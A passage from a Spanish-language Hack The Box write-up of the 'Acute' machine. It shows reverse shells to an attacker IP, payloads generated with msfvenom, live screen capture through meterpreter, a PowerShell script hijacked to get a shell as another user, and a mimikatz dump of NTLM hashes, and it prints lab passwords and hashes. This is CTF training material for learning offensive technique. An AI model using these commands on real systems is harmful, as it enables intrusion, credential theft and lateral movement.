</code></pre></div><p>Ahora, desde la máquina de atacante, iniciamos <code>nc</code> y ejecutamos el binario desde <code>Acute-PC01</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#021944!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">PS C:\Utils&gt;
<span class="pwsh-yellow">.\r.exe 10.10.17.44 4444 50 158</span>

CreatePseudoConsole function found! Spawning a fully interactive shell  
</code></pre></div><p>Y recibimos la conexión:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.145.
Ncat: Connection from 10.10.11.145:49865.
^Z
zsh: suspended  ncat -nlvp 4444

<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
[1]  + continued  ncat -nlvp 4444
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6  
PS C:\Utils&gt;
</code></pre></div><h2 id="capturas-de-pantalla-de-una-sesión-de-escritorio-remoto">Capturas de pantalla de una sesión de escritorio remoto</h2><p>En este punto, podemos ejecutar <a href="https://github.com/carlospolop/PEASS-ng"><code>winpeas.exe</code></a> para enumerar un poco más:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">PS C:\Utils&gt; <span class="code-yellow">curl</span> http://10.10.17.44/winPEASx64.exe <span class="code-grey">-o</span> w.exe  
</code></pre></div><p>Existe una sesión de RDP en proceso:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">╔══════════╣</span> <span class="code-green">RDP Sessions</span>
    <span class="code-grey">SessID    pSessionName   pUserName      pDomainName              State     SourceIP</span>  
    1         Console        <span class="code-magenta">edavies        ACUTE</span>                    Active
</code></pre></div><p>Podemos obtener esta misma información con este comando:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">PS C:\Utils&gt; <span class="code-yellow">query</span> user
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 edavies               console             1  Active      none   17/02/2022 20:06  
</code></pre></div><p>Ahora nos trataremos de conectar a esta sesión mediante <code>rdesktop</code> desde la máquina de atacante. Para ello, tenemos que utilizar <a href="https://github.com/jpillora/chisel"><code>chisel</code></a> y hacer que <code>Acute-PC01</code> sea un pivote (<em>proxy</em> SOCKS5).</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./chisel</span> server --port 1234 --reverse --socks5
server: Reverse tunnelling enabled
server: Fingerprint 5poOpBwlXtp1WxVRCm7EbKeboWO2ERpbS+LdvV4V6CY=  
server: Listening on http://0.0.0.0:1234
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">PS C:\Utils&gt; <span class="code-yellow">curl</span> http://10.10.17.44/chisel.exe <span class="code-grey">-o</span> c.exe  
PS C:\Utils&gt; <span class="code-yellow">.\c.exe</span> client 10.10.17.44:1234 R:socks
client: Connecting to ws://10.10.17.44:1234
client: Connected (Latency 36.4951ms)
</code></pre></div><p>Y la conexión se establece correctamente:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./chisel</span> server --port 1234 --reverse --socks5
server: Reverse tunnelling enabled
server: Fingerprint 5poOpBwlXtp1WxVRCm7EbKeboWO2ERpbS+LdvV4V6CY=
server: Listening on http://0.0.0.0:1234
server: session#1: Client version (0.0.0-src) differs from server version (1.7.7)  
server: session#1: tun: proxy#R:127.0.0.1:1080=&gt;socks: Listening
</code></pre></div><p>Vamos a verificar que llegamos a la máquina víctima:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">proxychains4</span> -q nmap -sT -sV -p 445,3389 172.16.22.1
Starting Nmap 7.92 ( https://nmap.org )
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for 172.16.22.1
Host is up (13s latency).

PORT     STATE  SERVICE       VERSION
445/tcp  open   microsoft-ds?
3389/tcp closed ms-wbt-server

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 49.25 seconds
</code></pre></div><p>Vemos que el puerto RDP está cerrado. A lo mejor la sesión sigue activa, por lo que podríamos hacer una captura de pantalla y visualizar dicha sesión. Para ello, tenemos que utilizar Metasploit.</p><p>Primero, creamos un binario con la consola de <code>meterpreter</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">msfvenom</span> -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.17.44 LPORT=4444 -f exe -o m.exe  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 200262 bytes
Final size of exe file: 206848 bytes
Saved as: m.exe
</code></pre></div><p>Iniciamos un <em>handler</em> con <code>msfconsole</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">msfconsole</span> -q
<span class="mtku">msf6</span> &gt; use multi/handler
<span class="code-blue">[*]</span> Using configured payload generic/shell_reverse_tcp
<span class="mtku">msf6</span> exploit(<span class="code-red">multi/handler</span>) &gt; set payload windows/x64/meterpreter_reverse_tcp  
payload =&gt; windows/x64/meterpreter_reverse_tcp
<span class="mtku">msf6</span> exploit(<span class="code-red">multi/handler</span>) &gt; set LPORT 4444
LPORT =&gt; 4444
<span class="mtku">msf6</span> exploit(<span class="code-red">multi/handler</span>) &gt; set LHOST 10.10.17.44
LHOST =&gt; 10.10.17.44
<span class="mtku">msf6</span> exploit(<span class="code-red">multi/handler</span>) &gt; run

<span class="code-blue">[*]</span> Started reverse TCP handler on 10.10.17.44:4444
</code></pre></div><p>Luego, subimos el binario y lo ejecutamos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">PS C:\Utils&gt; <span class="code-yellow">curl</span> http://10.10.17.44/m.exe <span class="code-grey">-o</span> m.exe  
PS C:\Utils&gt; <span class="code-yellow">.\m.exe</span>
</code></pre></div><p>Y recibimos la conexión:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">msfconsole</span> -q
<span class="mtku">msf6</span> &gt; use multi/handler
<span class="code-blue">[*]</span> Using configured payload generic/shell_reverse_tcp
<span class="mtku">msf6</span> exploit(<span class="code-red">multi/handler</span>) &gt; set payload windows/x64/meterpreter_reverse_tcp  
payload =&gt; windows/x64/meterpreter_reverse_tcp
<span class="mtku">msf6</span> exploit(<span class="code-red">multi/handler</span>) &gt; set LPORT 4444
LPORT =&gt; 4444
<span class="mtku">msf6</span> exploit(<span class="code-red">multi/handler</span>) &gt; set LHOST 10.10.17.44
LHOST =&gt; 10.10.17.44
<span class="mtku">msf6</span> exploit(<span class="code-red">multi/handler</span>) &gt; run

<span class="code-blue">[*]</span> Started reverse TCP handler on 10.10.17.44:4444
<span class="code-blue">[*]</span> Meterpreter session 1 opened (10.10.17.44:4444 -&gt; 10.10.11.145:49842)

<span class="mtku">meterpreter</span> &gt; getuid
Server username: ACUTE\edavies
<span class="mtku">meterpreter</span> &gt; screenshare
<span class="code-blue">[*]</span> Preparing player...
<span class="code-blue">[*]</span> Opening player at: ./xjWtVNMB.html
<span class="code-blue">[*]</span> Streaming...
</code></pre></div><p>Con estos comandos, veremos las capturas de pantalla en tiempo real:</p><p><img src="/images/HTB/Acute/Acute-screenshare.gif" alt="Acute RDP screenshots"></p><p>Y encontramos que el usuario está tratando de ejecutar los siguientes comandos:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7">Enter-PSSession</span> <span class="mtk5">-</span><span class="mtk1">computername</span> <span class="mtk1">atsserver</span>
<span class="mtk1">$pass</span> <span class="mtk5">=</span> <span class="mtk7">ConvertTo-SecureString</span> <span class="mtk4">"W3_4R3_th3_f0rce."</span> <span class="mtk5">-</span><span class="mtk1">AsPlaintext</span> <span class="mtk5">-</span><span class="mtk1">Force</span>
<span class="mtk1">$cred</span> <span class="mtk5">=</span> <span class="mtk7">New-Object</span> <span class="mtk1">System.Management.Automation.PSCredential</span> <span class="mtk1">(</span><span class="mtk4">"acute\imonks"</span><span class="mtk5">,</span> <span class="mtk1">$pass)</span>
<span class="mtk7">Enter-PSSession</span> <span class="mtk5">-</span><span class="mtk1">computername</span> <span class="mtk1">ATSSERVER</span> <span class="mtk5">-</span><span class="mtk1">credential</span> <span class="mtk1">$cred</span>
<span class="mtk7">Enter-PSSession</span> <span class="mtk5">-</span><span class="mtk1">computername</span> <span class="mtk1">ATSSERVER</span> <span class="mtk5">-</span><span class="mtk1">ConfigurationName</span> <span class="mtk1">dc_manage</span> <span class="mtk5">-</span><span class="mtk1">credential</span> <span class="mtk1">$cred</span>  
</code></pre></div><h2 id="ejecutando-comandos-en-el-controlador-de-dominio">Ejecutando comandos en el controlador de dominio</h2><p>Ahora podemos continuar desde la primera <em>reverse shell</em> en lugar de seguir con <code>meterpreter</code> y utilizar los comandos anteriores para conectarnos a la máquina víctima utilizando <em>script blocks</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">PS C:\Utils&gt; <span class="code-green">$pass</span> <span class="code-grey">=</span> <span class="code-yellow">ConvertTo-SecureString</span> <span class="code-dark-cyan">"W3_4R3_th3_f0rce."</span> <span class="code-grey">-AsPlaintext -Force</span>
PS C:\Utils&gt; <span class="code-green">$cred</span> <span class="code-grey">=</span> <span class="code-yellow">New-Object</span> System.Management.Automation.PSCredential (<span class="code-dark-cyan">"acute\imonks"</span>, <span class="code-green">$pass</span>)
PS C:\Utils&gt; <span class="code-yellow">Invoke-Command</span> atsserver <span class="code-grey">-ConfigurationName</span> dc_manage <span class="code-grey">-Credential</span> <span class="code-green">$cred</span> <span class="code-grey">-ScriptBlock</span> { <span class="code-yellow">whoami</span> }
acute\imonks
PS C:\Utils&gt; <span class="code-yellow">Invoke-Command</span> atsserver <span class="code-grey">-ConfigurationName</span> dc_manage <span class="code-grey">-Credential</span> <span class="code-green">$cred</span> <span class="code-grey">-ScriptBlock</span> { <span class="code-yellow">ls</span> C:\Users\imonks\Desktop }


    Directory: C:\Users\imonks\Desktop


Mode                 LastWriteTime         Length Name                                                  PSComputerName
----                 -------------         ------ ----                                                  --------------
-ar---        18/02/2022     10:38             34 user.txt                                              atsserver
-a----        11/01/2022     18:04            602 wm.ps1                                                atsserver


PS C:\Utils&gt; <span class="code-yellow">Invoke-Command</span> atsserver <span class="code-grey">-ConfigurationName</span> dc_manage <span class="code-grey">-Credential</span> <span class="code-green">$cred</span> <span class="code-grey">-ScriptBlock</span> { <span class="code-yellow">type</span> C:\Users\imonks\Desktop\user.txt }  
8df8cbb2405a467ccc13d7af36b0d611
</code></pre></div><p>En este punto, hemos conseguido la <em>flag</em> <code>user.txt</code>.</p><p>Vamos a verificar qué usuarios están configurados en esta máquina:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">PS C:\Utils&gt; <span class="code-yellow">Invoke-Command</span> atsserver <span class="code-grey">-ConfigurationName</span> dc_manage <span class="code-grey">-Credential</span> <span class="code-green">$cred</span> <span class="code-grey">-ScriptBlock</span> { <span class="code-yellow">net</span> user }  

User accounts for \\

-------------------------------------------------------------------------------
Administrator            awallace                 chall
edavies                  Guest                    imonks
jmorgan                  krbtgt                   lhopkins
The command completed with one or more errors.
</code></pre></div><p>El usuario <code>imonks</code> pertenece al grupo <code>Managers</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">PS C:\Utils&gt; <span class="code-yellow">Invoke-Command</span> atsserver <span class="code-grey">-ConfigurationName</span> dc_manage <span class="code-grey">-Credential</span> <span class="code-green">$cred</span> <span class="code-grey">-ScriptBlock</span> { <span class="code-yellow">net</span> user imonks /domain }  
User name                    imonks
Full Name                    Ieuan Monks
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            21/12/2021 14:51:31
Password expires             Never
Password changeable          22/12/2021 14:51:31
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   18/02/2022 11:04:17

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Managers
The command completed successfully.
</code></pre></div><p>Si consultamos más usuarios que pertenecen a <code>Managers</code> vemos que <code>awallace</code> también es miembro:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">PS C:\Utils&gt; <span class="code-yellow">Invoke-Command</span> atsserver <span class="code-grey">-ConfigurationName</span> dc_manage <span class="code-grey">-Credential</span> <span class="code-green">$cred</span> <span class="code-grey">-ScriptBlock</span> { <span class="code-yellow">net</span> groups Managers }  
Group name     Managers
Comment

Members

-------------------------------------------------------------------------------
awallace                 imonks
The command completed successfully.
</code></pre></div><p>Existe un directorio inusual en <code>C:\Program Files</code>, pero no tenemos permisos para acceder a él:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">PS C:\Utils&gt; <span class="code-yellow">Invoke-Command</span> atsserver <span class="code-grey">-ConfigurationName</span> dc_manage <span class="code-grey">-Credential</span> <span class="code-green">$cred</span> <span class="code-grey">-ScriptBlock</span> { <span class="code-yellow">ls</span> <span class="code-dark-cyan">"C:\Program Files"</span> }


    Directory: C:\Program Files


Mode                 LastWriteTime         Length Name                                                  PSComputerName
----                 -------------         ------ ----                                                  --------------
d-----        21/12/2021     00:04                common files                                          atsserver
d-----        21/12/2021     00:11                Hyper-V                                               atsserver
d-----        15/09/2018     08:12                internet explorer                                     atsserver
d-----        18/02/2022     12:54                keepmeon                                              atsserver
d-----        21/12/2021     00:04                VMware                                                atsserver
d-----        20/12/2021     21:19                Windows Defender                                      atsserver
d-----        20/12/2021     21:12                Windows Defender Advanced Threat Protection           atsserver
d-----        21/12/2021     14:13                WindowsPowerShell                                     atsserver


PS C:\Utils&gt; <span class="code-yellow">Invoke-Command</span> atsserver <span class="code-grey">-ConfigurationName</span> dc_manage <span class="code-grey">-Credential</span> <span class="code-green">$cred</span> <span class="code-grey">-ScriptBlock</span> { <span class="code-yellow">ls</span> <span class="code-dark-cyan">"C:\Program Files\keepmeon"</span> }  
<span class="code-red">Access to the path 'C:\Program Files\keepmeon' is denied.
    + CategoryInfo          : PermissionDenied: (C:\Program Files\keepmeon:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
    + PSComputerName        : atsserver</span>
</code></pre></div><p>En la carpeta <code>Desktop</code> de <code>imonks</code> hay un <em>script</em> en PowerShell:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">PS C:\Utils&gt; <span class="code-yellow">Invoke-Command</span> atsserver <span class="code-grey">-ConfigurationName</span> dc_manage <span class="code-grey">-Credential</span> <span class="code-green">$cred</span> <span class="code-grey">-ScriptBlock</span> { <span class="code-yellow">type</span> C:\Users\imonks\Desktop\wm.ps1 }  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">$securepasswd</span> <span class="mtk5">=</span> <span class="mtk4">'01000000d08c9ddf0115d1118c7a00c04fc297eb010000009</span><span class="mtk4">6ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000</span><span class="mtk4">003660000c00000001000000080f704e251793f5d4f903c715</span><span class="mtk4">8c8213d0000000004800000a000000010000000ac2606ccfda</span><span class="mtk4">6b4e0a9d56a20417d2f67280000009497141b794c6cb963d24</span><span class="mtk4">60bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e0</span><span class="mtk4">62ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6</span><span class="mtk4">e453c51'</span>  
<span class="mtk1">$passwd</span> <span class="mtk5">=</span> <span class="mtk1">$securepasswd</span> <span class="mtk5">|</span> <span class="mtk7">ConvertTo-SecureString</span>
<span class="mtk1">$creds</span> <span class="mtk5">=</span> <span class="mtk7">New-Object</span> <span class="mtk1">System.Management.Automation.PSCredential</span> <span class="mtk1">(</span><span class="mtk4">"acute\jmorgan"</span><span class="mtk5">,</span> <span class="mtk1">$passwd)</span>
<span class="mtk7">Invoke-Command</span> <span class="mtk5">-</span><span class="mtk1">ScriptBlock</span> <span class="mtk1">{</span><span class="mtk7">Get-Volume</span><span class="mtk1">}</span> <span class="mtk5">-</span><span class="mtk1">ComputerName</span> <span class="mtk1">Acute</span><span class="mtk5">-</span><span class="mtk1">PC01</span> <span class="mtk5">-</span><span class="mtk1">Credential</span> <span class="mtk1">$creds</span>
</code></pre></div><p>Está realizando acciones en <code>Acute-PC01</code> como <code>jmorgan</code>. Somos capaces de modificar este <em>script</em> en PowerShell para conseguir una <em>reverse shell</em> como <code>jmorgan</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">PS C:\Utils&gt; <span class="code-yellow">Invoke-Command</span> atsserver <span class="code-grey">-ConfigurationName</span> dc_manage <span class="code-grey">-Credential</span> <span class="code-green">$cred</span> <span class="code-grey">-ScriptBlock</span> { ((<span class="code-yellow">cat</span> <span class="code-dark-cyan">'C:\Users\imonks\Desktop\wm.ps1'</span> <span class="code-grey">-Raw</span>) <span class="code-grey">-Replace</span> <span class="code-dark-cyan">'Get-Volume'</span>, <span class="code-dark-cyan">' C:\Utils\r.exe 10.10.17.44 5555 50 158 '</span>) | <span class="code-yellow">Set-Content</span> <span class="code-grey">-Path</span> C:\Users\imonks\Desktop\wm.ps1 }  
PS C:\Utils&gt; <span class="code-yellow">Invoke-Command</span> atsserver <span class="code-grey">-ConfigurationName</span> dc_manage <span class="code-grey">-Credential</span> <span class="code-green">$cred</span> <span class="code-grey">-ScriptBlock</span> { <span class="code-yellow">type</span> C:\Users\imonks\Desktop\wm.ps1 }
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">$securepasswd</span> <span class="mtk5">=</span> <span class="mtk4">'01000000d08c9ddf0115d1118c7a00c04fc297eb010000009</span><span class="mtk4">6ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000</span><span class="mtk4">003660000c00000001000000080f704e251793f5d4f903c715</span><span class="mtk4">8c8213d0000000004800000a000000010000000ac2606ccfda</span><span class="mtk4">6b4e0a9d56a20417d2f67280000009497141b794c6cb963d24</span><span class="mtk4">60bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e0</span><span class="mtk4">62ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6</span><span class="mtk4">e453c51'</span>  
<span class="mtk1">$passwd</span> <span class="mtk5">=</span> <span class="mtk1">$securepasswd</span> <span class="mtk5">|</span> <span class="mtk7">ConvertTo-SecureString</span>
<span class="mtk1">$creds</span> <span class="mtk5">=</span> <span class="mtk7">New-Object</span> <span class="mtk1">System.Management.Automation.PSCredential</span> <span class="mtk1">(</span><span class="mtk4">"acute\jmorgan"</span><span class="mtk5">,</span> <span class="mtk1">$passwd)</span>
<span class="mtk7">Invoke-Command</span> <span class="mtk5">-</span><span class="mtk1">ScriptBlock</span> <span class="mtk1">{</span> <span class="mtk1">C:\Utils\</span><span class="mtk7">r.exe</span> <span class="mtk6">10.10</span><span class="mtk1">.</span><span class="mtk6">17.44</span> <span class="mtk6">5555</span> <span class="mtk6">50</span> <span class="mtk6">158</span> <span class="mtk1">}</span> <span class="mtk5">-</span><span class="mtk1">ComputerName</span> <span class="mtk1">Acute</span><span class="mtk5">-</span><span class="mtk1">PC01</span> <span class="mtk5">-</span><span class="mtk1">Credential</span> <span class="mtk1">$creds</span>
</code></pre></div><p>Y ahora está modificado. Si lo ejecutamos, obtenemos la <em>reverse shell</em> como <code>jmorgan</code> en <code>Acute-PC01</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">PS C:\Utils&gt; <span class="code-yellow">Invoke-Command</span> atsserver <span class="code-grey">-ConfigurationName</span> dc_manage <span class="code-grey">-Credential</span> <span class="code-green">$cred</span> <span class="code-grey">-ScriptBlock</span> { <span class="code-yellow">C:\Users\imonks\Desktop\wm.ps1</span> }  

CreatePseudoConsole function found! Spawning a fully interactive shell
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 5555
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::5555
Ncat: Listening on 0.0.0.0:5555
Ncat: Connection from 10.10.11.145.
Ncat: Connection from 10.10.11.145:49872.
^Z
zsh: suspended  ncat -nlvp 5555

<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
[1]  + continued  ncat -nlvp 5555
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6  

PS C:\Users\jmorgan\Documents>&gt; <span class="code-yellow">whoami</span>
acute\jmorgan
</code></pre></div><h2 id="extracción-de-_hashes_-ntlm">Extracción de <em>hashes</em> NTLM</h2><p>Descubrimos que <code>jmorgan</code> pertenece a <code>Administrators</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">PS C:\Users\jmorgan\Documents>&gt; <span class="code-yellow">whoami</span> /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ===============================================================  
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
</code></pre></div><p>Por tanto, podemos volcar los <em>hashes</em> NTLM del SAM utilizando <code>mimikatz.exe</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">PS C:\Users\jmorgan\Documents&gt; <span class="code-yellow">cd</span> C:\Utils
PS C:\Users\jmorgan\Documents> <span class="code-yellow">curl</span> http://10.10.17.44/mimikatz.exe <span class="code-grey">-o</span> mm.exe  
PS C:\Utils> <span class="code-yellow">.\mm.exe</span>

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
</code></pre></div><p>Ahora tenemos que introducir <code>privilege::debug</code>, <code>token::elevate</code>, <code>lsadump::sam</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

632     {0;000003e7} 0 D 23650          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,31p)       Primary
 -&gt; Impersonated !
 * Process Token : {0;00168d80} 0 D 1503149     ACUTE\jmorgan   S-1-5-21-1786406921-1914792807-2072761762-1108  (09g,24p)       Primary  
 * Thread Token  : {0;000003e7} 0 D 1818149     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,31p)       Impersonation (Delegation)

mimikatz # lsadump::sam
Domain : ACUTE-PC01
SysKey : 44397c32a634e3d8d8f64bff8c614af7
Local SID : S-1-5-21-2560123600-3246320471-2688489995

SAMKey : fb8ee3299f8af5fb2100621a50059fa2

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: a29f7623fd11550def0192de9246f46b
    lm  - 0: c8ff11012182f1dc95a478b25fdde0da
    ntlm- 0: a29f7623fd11550def0192de9246f46b

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 7699e833f3fc55323a6c2d9582bb143f

* Primary:Kerberos-Newer-Keys *
    Default Salt : MVL-SVR01.MARVEL.HTBAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : c3cd5b6f980fdebc434e04eed27ef73b7e257fda197e008bc7ef1b3502a075a5
      aes128_hmac       (4096) : 83cb77df0959373fb1f7dbdda42ad684
      des_cbc_md5       (4096) : 8f3249ef3dc1bff7

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : MVL-SVR01.MARVEL.HTBAdministrator
    Credentials
      des_cbc_md5       : 8f3249ef3dc1bff7


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 24571eab88ac0e2dcef127b8e9ad4740

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 014e3c3563b7599b4b2ffea6a1f5ce60

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 8f08a53f14bbb27f0283fd90323dcd4e21ccc7a119d60cbbafb6c461ded08710
      aes128_hmac       (4096) : 11e388be492e65daac6493f665631d3f
      des_cbc_md5       (4096) : 297ad0071abf5b6d

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : 297ad0071abf5b6d


RID  : 000003e9 (1001)
User : Natasha
  Hash NTLM: 29ab86c5c4d2aab957763e5c1720486d
    lm  - 0: f82f2bf1f89c2939790e40f751d5b190
    ntlm- 0: 29ab86c5c4d2aab957763e5c1720486d
    ntlm- 1: de3638aef735f9b81ea181465871e71b

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : fdd887d7c6e85189b2cbc37ac772b429

* Primary:Kerberos-Newer-Keys *
    Default Salt : MVL-SVR01.MARVEL.HTBNatasha
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 85ef7e3d1d28efc32cec29b4d2e201fc0eb55b05c5e3249f951aba713fe8fe67
      aes128_hmac       (4096) : 70893ba6dd932940051a0714a3a7b184
      des_cbc_md5       (4096) : 978a07d05ba770f7
    OldCredentials
      aes256_hmac       (4096) : 6d8e87f273e0260d402c65f1b6c3da5604dacf6d25a543a65827acdf927fd924
      aes128_hmac       (4096) : dedc1d09097b091f2e430a2c8d768107
      des_cbc_md5       (4096) : 1089e6eca449c731
    OlderCredentials
      aes256_hmac       (4096) : 6d8e87f273e0260d402c65f1b6c3da5604dacf6d25a543a65827acdf927fd924
      aes128_hmac       (4096) : dedc1d09097b091f2e430a2c8d768107
